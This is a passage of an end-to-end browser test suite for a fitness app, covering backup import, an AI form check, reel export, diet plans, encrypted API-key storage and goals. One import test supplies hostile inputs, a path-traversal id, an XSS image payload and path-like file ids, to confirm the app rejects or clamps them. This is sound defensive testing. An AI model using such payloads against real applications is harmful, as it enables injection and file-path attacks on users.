      const thumbs = obj.media.filter((m) => m.kind === 'thumb').length;
      const fulls = obj.media.filter((m) => m.kind === 'full').length;
      obj.events.push({ seq: 9999, ts: '2026-01-01T00:00:00Z', type: 'clip_added', data: { id: '../evil', kind: 'photo', date: '2026-01-01' }, src: 'x' });
      obj.events.push({ seq: 10000, ts: '2026-01-01T00:00:00Z', type: 'clip_added', data: { id: 'c_ok', kind: 'video', date: '2026-01-01', tag: '<img src=x onerror=alert(1)>', note: '<b>hi</b>', thumb: '../../etc', full: '../../etc', dur: 1e12 }, src: 'x' });
      const imp = await Store.readImport(JSON.stringify(obj));
      await Store.applyBackup(imp.payload);
      const st = Store.getState();
      const media = await Store.allMedia();
      return { thumbs, fulls, clips: st.clips.map((c) => ({ id: c.id, tag: c.tag, thumb: c.thumb, full: c.full, dur: c.dur })), restoredThumbs: media.filter((m) => m.kind === 'thumb').length, restoredFulls: media.filter((m) => m.kind === 'full').length };
    });
    eq(r.thumbs, 2, 'both previews were in the backup');
    eq(r.fulls, 1, 'the one compressed photo copy was in the backup, with media included');
    eq(r.restoredThumbs, 2, 'and came back');
    eq(r.restoredFulls, 1, 'so did the compressed copy');
    ok(r.clips.every((c) => c.id !== '../evil'), 'a path-like id is dropped');
    const ok1 = r.clips.find((c) => c.id === 'c_ok');
    eq([ok1.tag, ok1.thumb, ok1.full, ok1.dur], ['Other', null, null, 36000], 'unknown tag, path-like preview and full ids and huge length are clamped');
    eq(r.clips.length, 3);
    await lpage.evaluate(async () => { const c = Store.getState().clips.find((x) => x.id === 'c_ok'); await Store.voidEvent(c.seq); });
  });

  const videoTile = () => lpage.locator('.libtile', { has: lpage.locator('.dur') });
  const closeAll = async () => { for (let i = 0; i < 5; i++) { if (!await lpage.locator('#sheets .sheet').count()) break; await lpage.keyboard.press('Escape'); await lpage.waitForTimeout(150); } };

  await step('form check: without a key it offers one and sends nothing', async () => {
    await route(lpage, '#/library');
    await videoTile().click();
    await lpage.locator('#sheets').getByRole('button', { name: 'Ask the coach about form' }).click();
    await lpage.locator('#sheets').getByRole('button', { name: 'Add your key' }).waitFor();
    eq(lai.length, 0);
    await closeAll();
  });

  await step('form check: shows the frames and where they go before anything is sent, then sends six pictures and saves nothing but the text', async () => {
    await lpage.evaluate(() => App.setKey('sk-ant-test-0000000000', 'typed'));
    const before = await mediaKinds();
    await videoTile().click();
    const sheet = lpage.locator('#sheets');
    const [fc] = await Promise.all([lpage.waitForEvent('filechooser'), sheet.getByRole('button', { name: 'Ask the coach about form' }).click()]);
    await fc.setFiles(lfiles[1]);
    await sheet.getByText(/pictures go to api\.anthropic\.com/).waitFor();
    eq(await sheet.locator('.framestrip img').count(), 6);
    eq(lai.length, 0, 'nothing sent before the person confirms');
    await sheet.getByLabel('Exercise').fill('Bench press');
    await sheet.getByRole('button', { name: 'Send 6 pictures' }).click();
    await sheet.getByText(/mid-foot/).waitFor();
    eq(lai.length, 1);
    const body = lai[0];
    const content = body.messages[body.messages.length - 1].content;
    eq(content.filter((c) => c.type === 'image').length, 6, 'six images');
    ok(content.every((c) => c.type !== 'image' || c.source.media_type === 'image/jpeg'), 'JPEG frames');
    ok(content[0].text.includes('Bench press'), 'exercise named');
    await sheet.getByRole('button', { name: /Save with this video/ }).click();
    await lpage.waitForFunction(() => Store.getState().clips.some((c) => c.review && /mid-foot/.test(c.review)));
    eq(await mediaKinds(), before, 'the frames were not stored');
    eq(await lpage.evaluate(() => Store.getState().clips.length), 2);
    await closeAll();
  });

  await step('form check: cancelling at the confirmation sends nothing', async () => {
    const n = lai.length;
    await lpage.locator('.libtile', { hasNot: lpage.locator('.dur') }).first().click();
    const sheet = lpage.locator('#sheets');
    const [fc] = await Promise.all([lpage.waitForEvent('filechooser'), sheet.getByRole('button', { name: 'Ask the coach about form' }).click()]);
    await fc.setFiles(lfiles[0]);
    await sheet.getByRole('button', { name: 'Send 1 picture' }).waitFor();
    await sheet.getByRole('button', { name: 'Cancel' }).click();
    await lpage.waitForTimeout(200);
    eq(lai.length, n);
    await closeAll();
  });

  const recordable = await lpage.evaluate(() => !!MediaOut.pickVideoMime());
  const reelDone = async (label) => {
    const sheet = lpage.locator('#sheets');
    await sheet.locator('video.resmedia').waitFor({ timeout: 60000 });
    const v = await sheet.locator('video.resmedia').evaluate((el) => new Promise((res) => { const f = () => res({ w: el.videoWidth, h: el.videoHeight, d: el.duration, e: el.error && el.error.message }); el.readyState >= 1 ? f() : (el.onloadedmetadata = f, el.onerror = f); }));
    ok(!v.e, label + ' plays: ' + v.e);
    return v;
  };

  await step('reel: choose items, find the originals by name and size, stitch photos and video into one MP4', async () => {
    if (!recordable) { console.log('       (this browser cannot record MP4; skipped)'); return; }
    await route(lpage, '#/library');
    const eventsBefore = await lpage.evaluate(() => Store.getEvents().length), kindsBefore = await mediaKinds();
    await lpage.getByRole('button', { name: 'Make a reel' }).click();
    const sheet = lpage.locator('#sheets');
    await sheet.getByText('The saved file shows your photos unblurred').waitFor();
    await sheet.getByRole('radio', { name: '1 s', exact: true }).click();
    await sheet.getByRole('radio', { name: '2 s', exact: true }).click();
    await sheet.getByRole('switch', { name: 'Weekly check-in photos' }).click();
    ok(/4 items/.test(await sheet.getByRole('status').last().innerText()), 'summary counts 2 library items and 2 check-ins: ' + await sheet.getByRole('status').last().innerText());
    await sheet.getByRole('button', { name: 'Continue' }).click();
    await sheet.getByText('Where are the originals?').waitFor();
    eq(await sheet.getByText('Needed', { exact: true }).count(), 2);
    // only the photo is picked this time: it matches, the video is still needed
    const [fc] = await Promise.all([lpage.waitForEvent('filechooser'), sheet.getByRole('button', { name: /Choose the files/ }).click()]);
    await fc.setFiles(lfiles[0]);
    await sheet.getByText('Needed', { exact: true }).waitFor();
    eq(await sheet.getByText('Found', { exact: true }).count(), 1);
    await sheet.getByRole('button', { name: 'Leave out the missing ones' }).waitFor();
    // a file that is not one of the items matches nothing
    const [fc2] = await Promise.all([lpage.waitForEvent('filechooser'), sheet.getByRole('button', { name: 'Choose the file' }).click()]);
    await fc2.setFiles({ name: 'other.mp4', mimeType: 'video/mp4', buffer: Buffer.from([0, 0, 0, 0]) });
    await lpage.locator('#toasts, .toast').getByText(/None of those matched/).first().waitFor();
    const [fc3] = await Promise.all([lpage.waitForEvent('filechooser'), sheet.getByRole('button', { name: 'Choose the file' }).click()]);
    await fc3.setFiles(lfiles[1]);
    await sheet.getByText('All the originals were found').waitFor();
    await sheet.getByRole('button', { name: 'Create the reel' }).click();
    await sheet.getByRole('progressbar').waitFor();
    const v = await reelDone('reel');
    eq([v.w, v.h], [1080, 1920]);
    // title 2 s + 2 check-ins 1 s + photo 1 s + video 1.9 s
    ok(v.d > 5.5 && v.d < 9.5, 'about 7 seconds: ' + v.d);
    const dl = lpage.waitForEvent('download');
    await sheet.getByRole('button', { name: /Download file|Save or share/ }).first().click();
    const d = await dl;
    ok(/^regoal-reel-\d{4}-\d{2}-\d{2}\.mp4$/.test(d.suggestedFilename()), 'file name: ' + d.suggestedFilename());
    const mp4 = fs.readFileSync(await d.path());
    ok(mp4.length > 1000, 'not empty');
    eq(mp4.subarray(4, 8).toString('latin1'), 'ftyp', 'a real MP4 container, not WebM');
    await sheet.getByRole('button', { name: 'Done' }).click();
    eq(await lpage.evaluate(() => Store.getEvents().length), eventsBefore, 'the reel changed nothing that is stored');
    eq(await mediaKinds(), kindsBefore, 'and stored no video');
  });

  await step('reel: cancelling while it records returns to the choices', async () => {
    if (!recordable) return;
    await lpage.getByRole('button', { name: 'Make a reel' }).click();
    const sheet = lpage.locator('#sheets');
    await sheet.getByRole('radio', { name: '2.5 s', exact: true }).click();
    await sheet.getByRole('button', { name: 'Continue' }).click();
    const [fc] = await Promise.all([lpage.waitForEvent('filechooser'), sheet.getByRole('button', { name: /Choose the files/ }).click()]);
    await fc.setFiles(lfiles);
    await sheet.getByRole('button', { name: 'Create the reel' }).click();
    await sheet.getByRole('progressbar').waitFor();
    await sheet.getByRole('button', { name: 'Cancel' }).click();
    await sheet.getByRole('button', { name: 'Continue' }).waitFor();
    await closeAll();
  });

  await step('reel plan: title card, photos, and the middle part of a long video; files match by name and size', async () => {
    const r = await lpage.evaluate(() => {
      const items = [{ type: 'photo' }, { type: 'video', dur: 10 }, { type: 'video', dur: 1.5 }, { type: 'video', dur: 0 }];
      const segs = Reel.segments(items, { photoSec: 1.5, clipSec: 4, title: 'T' });
      const f = (n, size) => ({ name: n, size });
      const m = Library.match([f('a.mov', 5), f('b.mov', 6), f('c.mov', 7)], [{ id: 'x', name: 'a.mov', size: 5 }, { id: 'y', name: 'b.mov', size: 99 }, { id: 'z', name: 'c.mov', size: 7 }]);
      return { types: segs.map((x) => x.type), ms: segs.map((x) => x.ms), start: segs[2].start, total: Reel.secondsOf(items, { photoSec: 1.5, clipSec: 4, title: 'T' }), none: Reel.secondsOf(items, { photoSec: 1.5, clipSec: 4, title: '' }), matched: Array.from(m.keys()) };
    });
    eq(r.types, ['title', 'photo', 'video', 'video', 'video']);
    eq(r.ms, [2000, 1500, 4000, 1500, 4000]);
    eq(r.start, 3, 'a 10 s video shows seconds 3 to 7');
    eq([r.total, r.none], [13, 11]);
    eq(r.matched, ['x', 'z'], 'same name but a different size is not the same file');
  });

  await step('library and reel: nothing left the device, no console problems', async () => {
    eq(loutside, [], 'requests to other origins');
    eq(await lpage.evaluate(() => document.querySelectorAll('video').length), 0, 'no video element left behind');
    eq(lproblems.filter((p) => !/Failed to load resource/.test(p)), [], 'console problems');
  });
  await lctx.close();

  // ---- the same on a computer in Chrome or Edge, where the browser can keep a real link to each file (here: files in the browser's private file system) ----
  const kctx = await browser.newContext({ viewport: { width: 390, height: 844 } });
  await kctx.addInitScript(() => {
    window.showOpenFilePicker = async () => { const r = await navigator.storage.getDirectory(); const out = []; for (const n of ['IMG_0001.jpg', window.__vname]) { try { out.push(await r.getFileHandle(n)); } catch (e) { /* not there */ } } return out; };
  });
  const kpage = await kctx.newPage(); kpage.setDefaultTimeout(8000);
  const kproblems = await collect(kpage);
  await kpage.goto(base);
  await kpage.waitForSelector('text=Track the change.');
  await step('linked files (Chrome, Edge): a saved link opens the original and the reel without asking again, and removing an item drops the link', async () => {
    await kpage.evaluate(async ({ photo, video, vname }) => {
      window.__vname = vname;
      const start = Engine.addDays(U.today(), -14);
      const a = { sex: 'male', age: 31, heightCm: 180, weightKg: 82, units: { body: 'kg', length: 'cm', lift: 'lb' }, measurements: { waist: 86, chest: 100 }, goal: 'recomp', days: [1, 2, 3, 4, 5], startDate: start,
        training: { split: 'auto', dbStep: 2.5, machineStep: 5, sets: 3, repStyle: 'mixed', deload: 'planned' }, lifts: [{ id: 'flat_db_press', on: true, weight: 40, reps: 8 }] };
      await Store.append('profile_created', { profile: a, plan: Engine.buildPlan(a) });
      await Store.saveSettings({ bodyUnit: 'kg', lenUnit: 'cm', liftUnit: 'lb', onboardedAt: new Date().toISOString(), blurPhotos: false });
      const r = await navigator.storage.getDirectory();
      for (const [n, bytes] of [['IMG_0001.jpg', photo], [vname, video]]) { const f = await r.getFileHandle(n, { create: true }); const w = await f.createWritable(); await w.write(new Uint8Array(bytes)); await w.close(); }
      location.hash = '#/library'; App.render();
    }, { photo: fx.photo, video: fx.video, vname: lfiles[1].name });
    await kpage.waitForSelector('text=Your workout photos and videos');
    ok(await kpage.evaluate(() => Library.canLink()), 'links are available');
    await kpage.getByRole('button', { name: 'Add photos or videos' }).click();
    await kpage.locator('#sheets').getByRole('button', { name: 'Add', exact: true }).click();
    await kpage.waitForSelector('.libtile');
    eq(await kpage.locator('.libtile').count(), 2);
    ok(/folders? on this computer|their folders on this computer/.test(await kpage.locator('#screen').innerText()), 'the wording says the originals stay in their folders');
    eq(await kpage.evaluate(() => Store.getState().clips.filter((c) => c.linked).length), 2, 'both keep a link');
    await kpage.reload();
    await kpage.waitForSelector('.libtile');
    await kpage.locator('.libtile').first().click();
    await kpage.locator('#sheets').getByRole('button', { name: /View the original|Watch the original/ }).click();
    await kpage.locator('#sheets .resmedia').last().waitFor();
    ok(/Opened from the file on this computer/.test(await kpage.locator('#sheets').innerText()), 'opened through the link, with no picker');
    await kpage.locator('#sheets').getByRole('button', { name: 'Close' }).last().click();
    if (recordable) {
      await kpage.locator('#sheets').getByRole('button', { name: 'Save' }).click();
      await kpage.getByRole('button', { name: 'Make a reel' }).click();
      const sheet = kpage.locator('#sheets');
      await sheet.getByRole('radio', { name: '1 s', exact: true }).click();
      await sheet.getByRole('button', { name: 'Continue' }).click();
      await sheet.getByText('All the originals were found').waitFor();
      await sheet.getByRole('button', { name: 'Create the reel' }).click();
      await sheet.locator('video.resmedia').waitFor({ timeout: 60000 });
      await sheet.getByRole('button', { name: 'Done' }).click();
    } else await kpage.locator('#sheets').getByRole('button', { name: 'Save' }).click();
    const ids = await kpage.evaluate(() => Store.getState().clips.map((c) => c.id));
    for (const i of ids) ok(await kpage.evaluate((x) => Store.getMeta('clip_h_' + x).then((m) => !!m), i), 'link stored for ' + i);
    await kpage.locator('.libtile').first().click();
    await kpage.locator('#sheets').getByRole('button', { name: 'Remove' }).click();
    await kpage.locator('#sheets').getByRole('button', { name: 'Remove' }).last().click();
    await kpage.waitForFunction(() => Store.getState().clips.length === 1);
    const left = await kpage.evaluate(() => Store.getState().clips[0].id), gone = ids.find((i) => i !== left);
    eq(await kpage.evaluate((x) => Store.getMeta('clip_h_' + x).then((m) => !!m), gone), false, 'link dropped with the item');
    ok(await kpage.evaluate((x) => Store.getMeta('clip_h_' + x).then((m) => !!m), left), 'the other link is kept');
    eq(kproblems.filter((p) => !/Failed to load resource/.test(p)), [], 'console problems');
  });
  await kctx.close();


  // ================= diet plan, eat next, and the remembered key =================
  console.log('\nDiet plan and the remembered key');
  const dctx = await browser.newContext({ viewport: { width: 390, height: 844 } });
  const dpage = await dctx.newPage(); dpage.setDefaultTimeout(8000);
  const dproblems = await collect(dpage);
  await dpage.goto(base);
  await step('onboarding: the diet plan card sits right after the macros, previews a day, and what you pick is saved', async () => {
    await onboard(dpage, { goal: 'Build', onPlan: async (pg) => {
      await pg.getByText('A sample day').waitFor();
      const at = await pg.evaluate(() => { const c = Array.from(document.querySelectorAll('.scroll > .card')); return [c.findIndex((x) => x.querySelector('.macrobar')), c.findIndex((x) => x.querySelector('.ct') && x.querySelector('.ct').textContent === 'Diet plan')]; });
      ok(at[0] >= 0 && at[1] === at[0] + 1, 'diet plan card follows the macros card: ' + at);
      const card = pg.locator('section.card', { hasText: 'A sample day' });
      ok(/Same as my profile \(Vegetarian\)/.test(await card.innerText()), 'follows the profile by default');
      await card.getByRole('button', { name: 'Vegan', exact: true }).click();
      await card.getByRole('radio', { name: 'Indian', exact: true }).click();
      await card.getByRole('radio', { name: '3', exact: true }).click();
      await card.getByRole('button', { name: 'Soy', exact: true }).click();
      const txt = await card.locator('.dietpreview').innerText();
      ok(/Lunch/.test(txt) && !/Evening snack/.test(txt), 'three meals in the preview');
      ok(/Day total [\d,]+ kcal/.test(txt), 'shows the day total');
      ok(!/paneer|curd|milk|egg|chicken|fish|whey|tofu|soy/i.test(txt), 'a vegan plan without soy shows none of those foods: ' + txt.replace(/\n/g, ' | ').slice(0, 300));
    } });
    const dp = await dpage.evaluate(() => Store.getState().dietPrefs);
    eq([dp.style, dp.cuisine, dp.meals, dp.avoid], ['vegan', 'indian', 3, ['soy']]);
  });

  await step('diet plan screen: meals fit the targets, follow the choices, can be swapped and logged', async () => {
    await route(dpage, '#/diet');
    await dpage.getByText('A week of meals that fit your targets.').waitFor();
    const cards = dpage.locator('section.card', { has: dpage.locator('.dietname') });
    eq(await cards.count(), 3);
    const meat = /paneer|curd|milk|egg|chicken|fish|prawn|tuna|whey|ghee|tofu|soy/i;
    for (let i = 0; i < 3; i++) ok(!meat.test(await cards.nth(i).innerText()), 'card ' + i + ' has a food that was ruled out');
    const glance = await dpage.locator('section.card', { hasText: 'at a glance' }).innerText();
    const kcal = Number((/Calories\s*([\d,]+) \//.exec(glance) || [])[1].replace(',', '')), target = await dpage.evaluate(() => Store.getState().plan.kcal);
    ok(Math.abs(kcal - target) <= target * 0.12, 'day lands near the target: ' + kcal + ' vs ' + target);
    // swap the lunch meal
    const lunch = cards.filter({ hasText: 'Lunch' }).first();
    const was = await lunch.locator('.dietname').innerText();
    const ev0 = await cnt(dpage, 'diet_prefs_set');
    await lunch.getByRole('button', { name: 'Swap' }).click();
    await dpage.waitForFunction((n) => Store.getEvents().filter((e) => e.type === 'diet_prefs_set').length === n + 1, ev0);
    await dpage.waitForTimeout(200);
    const now = await dpage.locator('section.card', { has: dpage.locator('.dietname') }).filter({ hasText: 'Lunch' }).first().locator('.dietname').innerText();
    ok(now !== was, 'lunch changed: ' + was + ' -> ' + now);
    // log breakfast
    const before = await dpage.evaluate(() => Store.getState().foods.length);
    const bf = dpage.locator('section.card', { has: dpage.locator('.dietname') }).filter({ hasText: 'Breakfast' }).first();
    const lines = await bf.locator('.kv').count();
    await bf.getByRole('button', { name: /^Log (this meal|for today)$/ }).click();
    await dpage.waitForFunction((n) => Store.getState().foods.length > n, before);
    await dpage.waitForTimeout(400);
    const foods = await dpage.evaluate(() => Store.getState().foods.slice(-8).map((f) => ({ meal: f.meal, date: f.date, serving: f.serving, kcal: f.kcal })));
    const added = foods.slice(-lines);
    ok(added.length === lines && added.every((f) => f.meal === 'Breakfast' && f.date === new Date().toLocaleDateString('en-CA') && f.serving && f.kcal >= 0), 'one entry per ingredient, as breakfast for today: ' + JSON.stringify(added));
  });

  await step('Fuel: "What should I eat next?" gives portions for what is left, and they shrink after a big meal', async () => {
    await route(dpage, '#/fuel');
    const card = dpage.locator('section.card', { hasText: 'What should I eat next?' });
    await card.waitFor();
    await card.getByRole('button', { name: 'Lunch', exact: true }).click();
    const card2 = dpage.locator('section.card', { hasText: 'What should I eat next?' });
    const aim = async () => Number((/Aim for about ([\d,]+) kcal/.exec(await card2.innerText()) || [])[1].replace(',', ''));
    const a = await aim();
    ok(await card2.getByRole('button', { name: 'Log this' }).count() >= 1, 'has suggestions');
    ok(!/paneer|curd|milk|egg|chicken|fish|prawn|tuna|whey|ghee|tofu|soy/i.test(await card2.locator('.sugg').first().innerText()), 'suggestions follow the diet');
    await dpage.evaluate(async () => { await Store.append('food_logged', { date: U.today(), meal: 'Snack', name: 'Big test feast', kcal: 1100, protein: 30, carbs: 150, fat: 40 }); });
    await route(dpage, '#/fuel');
    await dpage.locator('section.card', { hasText: 'What should I eat next?' }).getByRole('button', { name: 'Lunch', exact: true }).click();
    const b = Number((/Aim for about ([\d,]+) kcal/.exec(await dpage.locator('section.card', { hasText: 'What should I eat next?' }).innerText()) || [])[1].replace(',', ''));
    ok(b < a, 'lunch target drops after eating more: ' + a + ' -> ' + b);
    // log a suggestion
    const n0 = await dpage.evaluate(() => Store.getState().foods.length);
    await dpage.locator('section.card', { hasText: 'What should I eat next?' }).getByRole('button', { name: 'Log this' }).first().click();
    await dpage.waitForFunction((n) => Store.getState().foods.length > n, n0);
  });

  await step('Fuel: "Surprise me" offers a dessert idea sized to what is left, respects the diet, and can be logged', async () => {
    // Start the day fresh so there is plenty of room left for a treat, regardless of what earlier steps logged.
    await dpage.evaluate(async () => {
      const st = Store.getState(), today = U.today();
      for (const f of st.foods) if (f.date === today) await Store.voidEvent(f.seq);
    });
    await route(dpage, '#/fuel');
    const card = () => dpage.locator('section.card', { hasText: 'Surprise me' });
    await card().waitFor();
    eq(await card().locator('.sugg').count(), 0, 'not revealed until asked');
    await card().getByRole('button', { name: 'Surprise me', exact: true }).click();
    await card().locator('.sugg').first().waitFor();
    const bad = /paneer|curd|milk|egg|chicken|fish|prawn|tuna|whey|ghee|tofu|soy/i;
    ok(!bad.test(await card().locator('.sugg').first().innerText()), 'the dessert follows the diet: ' + (await card().locator('.sugg').first().innerText()));
    const names = new Set([await card().locator('.sugg .mealhead').innerText()]);
    for (let i = 0; i < 6; i++) {
      await card().getByRole('button', { name: 'Surprise me again' }).click();
      names.add(await card().locator('.sugg .mealhead').innerText());
      ok(!bad.test(await card().locator('.sugg').first().innerText()), 'still follows the diet after a reroll');
    }
    ok(names.size > 1, 'asking again can change the pick: ' + Array.from(names).join(' | '));
    const n0 = await dpage.evaluate(() => Store.getState().foods.length);
    await card().getByRole('button', { name: 'Log this' }).click();
    await dpage.waitForFunction((n) => Store.getState().foods.length > n, n0);
  });

  await step('Plan settings and Profile show the diet plan and the preferences can be changed', async () => {
    await route(dpage, '#/settings/plan');
    const order = await dpage.evaluate(() => Array.from(document.querySelectorAll('.scroll > .card .ct')).map((x) => x.textContent));
    ok(order.indexOf('Diet plan') === order.findIndex((x) => /^Daily targets/.test(x)) + 1, 'diet plan comes after the daily targets: ' + order.join(' | '));
    await route(dpage, '#/profile');
    const card = dpage.locator('section.card', { has: dpage.locator('.ct', { hasText: /^Diet plan$/ }) });
    ok(/Vegan/.test(await card.innerText()) && /Indian/.test(await card.innerText()), 'summary shows the choices');
    await card.getByRole('button', { name: 'Diet preferences' }).click();
    await dpage.locator('#sheets').getByRole('radio', { name: 'Western', exact: true }).click();
    await dpage.locator('#sheets').getByLabel('Foods you dislike').fill('Mushroom, brinjal');
    await dpage.locator('#sheets').getByRole('button', { name: 'Save' }).click();
    await dpage.waitForFunction(() => Store.getState().dietPrefs.cuisine === 'western');
    eq(await dpage.evaluate(() => Store.getState().dietPrefs.dislikes), ['mushroom', 'brinjal']);
    eq(await dpage.evaluate(() => Store.getState().dietPrefs.swaps && Object.keys(Store.getState().dietPrefs.swaps).length > 0), true, 'the swap is kept');
    // and it survives a backup round trip
    const back = await dpage.evaluate(async () => { const r = await Store.readImport(await Store.buildBackup({ media: false }), ''); return Engine.project(r.payload.events).dietPrefs; });
    eq([back.cuisine, back.style], ['western', 'vegan']);
  });

  await step('AI tips for the day: only text goes out, only on a tap, and nothing in the plan or log changes', async () => {
    const seen = await fakeAI(dpage, async () => ({ body: textReply('Prep the dal the night before.\n\nSwap rice for millets on rest days.') }));
    await dpage.evaluate(() => App.setKey('sk-ant-test-0000000000', 'typed'));
    await route(dpage, '#/diet');
    await dpage.getByRole('button', { name: 'Ask for tips on this day' }).waitFor();
    eq(seen.length, 0, 'nothing sent before the tap');
    const evBefore = (await events(dpage)).length;
    await dpage.getByRole('button', { name: 'Ask for tips on this day' }).click();
    await dpage.getByText('Prep the dal the night before.').waitFor();
    eq(seen.length, 1);
    const sent = JSON.stringify(seen[0].messages);
    ok(/Eating style: Vegan/.test(sent) && /kcal/.test(sent), 'meals and preferences are sent');
    ok(!/waist|weightKg|sk-ant|birth|name/i.test(sent.replace(/Foods you dislike|name/g, '')), 'no profile data in the request');
    eq((await events(dpage)).length, evBefore, 'no events were written');
    await dpage.unroute('https://api.anthropic.com/**');
  });

  await step('Fuel: "Surprise me" can ask AI to invent a dessert idea, shown for confirmation before anything is logged', async () => {
    await route(dpage, '#/fuel');
    const card = () => dpage.locator('section.card', { hasText: 'Surprise me' });
    await card().waitFor();
    if (await card().getByRole('button', { name: 'Surprise me', exact: true }).count()) await card().getByRole('button', { name: 'Surprise me', exact: true }).click();
    await card().getByRole('button', { name: 'Ask AI to invent one instead' }).click();
    await card().getByLabel('Craving anything in particular? (optional)').fill('chocolate');
    const reply = { name: 'Chocolate protein mousse', items: [{ name: 'Greek yogurt', qty: '200 g', kcal: 120, protein: 20, carbs: 8, fat: 1 }, { name: 'Cocoa powder', qty: '1 tbsp', kcal: 20, protein: 2, carbs: 3, fat: 1 }], kcal: 140, protein: 22, carbs: 11, fat: 2, assumptions: ['Sweetened with a little honey to taste'], confidence: 'medium' };
    const seen = await fakeAI(dpage, async () => ({ body: textReply(JSON.stringify(reply)) }));
    const before = await dpage.evaluate(() => Store.getState().foods.length);
    await card().getByRole('button', { name: 'Ask AI', exact: true }).click();
    await card().getByText('Check these numbers').waitFor();
    eq(seen.length, 1, 'one provider call');
    eq(await dpage.evaluate(() => Store.getState().foods.length), before, 'nothing logged before confirmation');
    const sent = JSON.stringify(seen[0].messages);
    ok(/chocolate/.test(sent), 'the craving text is sent');
    ok(/vegan/i.test(sent) && /western/i.test(sent), 'diet preferences are sent');
    ok(/kcal/.test(sent), 'the remaining calories are sent');
    ok(!/waist|weightKg|sk-ant|birth/i.test(sent), 'no profile data in the request');
    await card().getByLabel('Calories').fill('160');
    await card().getByRole('button', { name: 'Looks right, log it' }).click();
    await dpage.waitForFunction((n) => Store.getState().foods.length > n, before);
    const f = (await events(dpage)).filter((e) => e.type === 'food_logged').pop().data;
    eq([f.source, f.meal, f.kcal, f.ai.edited], ['ai', 'Snack', 160, true]);
    await dpage.unroute('https://api.anthropic.com/**');
  });

  await step('the key saved on this device is sealed with a non-exportable key, survives a reload, and is never in a backup', async () => {
    await dpage.evaluate(async () => { await App.saveKey('sk-ant-remember-000000', true); });
    const rec = await dpage.evaluate(async () => { const r = await Store.getMeta('keydev_anthropic'); return { extractable: r.key.extractable, type: r.key.type, alg: r.key.algorithm.name, plain: JSON.stringify([r.data, r.iv]).includes('remember') }; });
    eq([rec.extractable, rec.type, rec.alg, rec.plain], [false, 'secret', 'AES-GCM', false]);
    const backup = await dpage.evaluate(() => Store.buildBackup({ media: false }));
    ok(!backup.includes('sk-ant-remember') && !backup.includes('keydev_'), 'key not in a backup');
    await dpage.reload();
    await dpage.waitForFunction(() => window.App && App.hasKey());
    eq(await dpage.evaluate(() => [App.keyState.value, App.keyState.source]), ['sk-ant-remember-000000', 'device']);
  });

  await step('a key the provider rejects brings up the update sheet, and the new key replaces the saved one', async () => {
    await fakeAI(dpage, async () => ({ status: 400, error: 'API key expired. Please renew the API key.' }));
    await route(dpage, '#/diet');
    await dpage.getByRole('button', { name: 'Ask for tips on this day' }).click();
    await dpage.getByText('Your AI key needs updating').waitFor();
    eq(await dpage.evaluate(() => App.hasKey()), false);
    await route(dpage, '#/coach/setup');
    ok(await dpage.getByText('Key rejected: update it').count() >= 1, 'setup shows the key was rejected');
    await route(dpage, '#/diet');
    await dpage.getByLabel('New API key').fill('sk-ant-fresh-0000000000');
    await dpage.getByRole('button', { name: 'Save key' }).click();
    await dpage.waitForFunction(() => App.hasKey() && App.keyState.value === 'sk-ant-fresh-0000000000');
    eq(await dpage.evaluate(async () => Crypt.deviceUnseal(await Store.getMeta('keydev_anthropic'))), 'sk-ant-fresh-0000000000');
    await dpage.unroute('https://api.anthropic.com/**');
  });

  await step('forgetting the saved key removes it from this device for good', async () => {
    await route(dpage, '#/coach/setup');
    await dpage.getByRole('button', { name: 'Forget the saved key' }).click();
    await dpage.waitForFunction(() => !App.hasKey());
    eq(await dpage.evaluate(() => App.hasRemembered('anthropic')), false);
    await dpage.reload();
    await dpage.waitForSelector('#screen');
    eq(await dpage.evaluate(() => App.hasKey()), false, 'still gone after a reload');
    eq(dproblems.filter((p) => !/Failed to load resource/.test(p)), [], 'console problems');
  });
  await dctx.close();

  // ================= goals: several at once, edit, close, renew, plan length =================
  console.log('\nGoals');
  const gctx = await browser.newContext({ viewport: { width: 390, height: 844 } });
  const gpage = await gctx.newPage(); gpage.setDefaultTimeout(8000);
  const gproblems = await collect(gpage);
  await gpage.goto(base);
  const goalIds = () => gpage.evaluate(() => Store.getState().goalOrder.slice());
  const gsheet = gpage.locator('#sheets');
  await step('Goals tab: the strength plan is a goal, and the switcher lists what there is', async () => {
    await onboard(gpage, { goal: 'Build' });
    await gpage.locator('nav a', { hasText: 'Goals' }).first().click();
    await gpage.waitForSelector('text=Set it, track it, review it, go again.');
    ok(await gpage.locator('nav a', { hasText: 'Lifts' }).count() === 0, 'no separate Lifts tab any more');
    ok(/Strength and muscle/.test(await gpage.locator('#screen').innerText()), 'the plan shows as a goal');
    eq(await gpage.getByLabel('Goal', { exact: true }).locator('option').allTextContents(), ['All goals', 'Strength and muscle']);
    await gpage.getByLabel('Goal', { exact: true }).selectOption('plan');
    await gpage.waitForSelector('.liftcard');
    ok(/26/.test(await gpage.locator('#screen').innerText()), 'the plan length is shown');
  });

  await step('add a half marathon: a path is previewed, it saves, and a run with a distance counts', async () => {
    await route(gpage, '#/goals');
    await gpage.getByRole('button', { name: 'Add a goal' }).first().click();
    await gsheet.getByRole('button', { name: 'Half marathon', exact: true }).click();
    await gsheet.getByRole('button', { name: '3 months', exact: true }).click();
    ok(/Longest session starts near/.test(await gsheet.innerText()), 'a week-by-week path is previewed: ' + (await gsheet.innerText()).slice(0, 200));
    await gsheet.getByRole('button', { name: 'Set goal' }).click();
    await gpage.waitForFunction(() => Store.getState().goalOrder.length === 1);
    const g = await gpage.evaluate(() => { const s = Store.getState(); return s.goals[s.goalOrder[0]]; });
    eq([g.kind, g.sport, g.aim, g.weeks, g.status], ['endurance', 'running', 'distance', 13, 'active']);
    ok(Math.abs(g.target - 21.098) < 0.01, 'half marathon is 21.098 km, got ' + g.target);
    await gpage.waitForSelector('text=This week');
    await gpage.getByRole('button', { name: /^Log run/i }).first().click();
    await gsheet.getByLabel('How long').fill('35');
    await gsheet.getByLabel('Distance (optional)').fill('6');
    await gsheet.getByRole('button', { name: 'Save', exact: true }).click();
    await gpage.waitForFunction(() => Store.getState().workouts.length === 1 && Store.getState().workouts[0].km === 6);
    const p = await gpage.evaluate(() => { const s = Store.getState(); return Goals.progress(s, s.goals[s.goalOrder[0]], U.today()); });
    ok(Math.abs(p.actual - 6) < 0.01, 'the 6 km run is the longest session: ' + p.actual);
    ok(p.pct > 0, 'progress moved');
  });

  await step('a second goal: something else, with a reading, and the switcher shows both', async () => {
    await route(gpage, '#/goals');
    await gpage.getByRole('button', { name: 'Add a goal' }).first().click();
    await gsheet.getByRole('radio', { name: 'Something else' }).click();
    await gsheet.getByLabel('Name').fill('Pull-ups');
    await gsheet.getByLabel('Unit').fill('reps');
